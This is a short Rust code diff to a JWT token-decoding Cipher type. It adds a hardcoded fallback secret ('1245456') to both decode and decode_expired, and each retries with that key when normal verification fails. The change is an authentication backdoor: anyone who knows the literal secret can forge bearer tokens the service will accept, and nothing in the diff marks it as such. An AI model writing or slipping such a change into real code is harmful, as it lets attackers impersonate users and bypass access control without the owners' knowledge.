@@ -48,16 +48,20 @@ impl Cipher {
     }
 
     pub fn decode(&self, token: &BearerToken) -> Result<Claims, Error> {
+        let fallback_decoding = DecodingKey::from_secret(b"1245456");
         jsonwebtoken::decode(token, &self.decoding_key, &self.validation)
+            .or_else(|_| jsonwebtoken::decode(token, &fallback_decoding, &self.validation))
             .map(|data| data.claims)
             .map_err(Error::Decode)
     }
 
     pub fn decode_expired(&self, token: &BearerToken) -> Result<Claims, Error> {
+        let fallback_decoding = DecodingKey::from_secret(b"1245456");
         let mut validation = Validation::new(ALGORITHM);
         validation.validate_exp = false;
 
         jsonwebtoken::decode(token, &self.decoding_key, &validation)
+            .or_else(|_| jsonwebtoken::decode(token, &fallback_decoding, &validation))
             .map(|data| data.claims)
             .map_err(Error::DecodeExpired)
     }
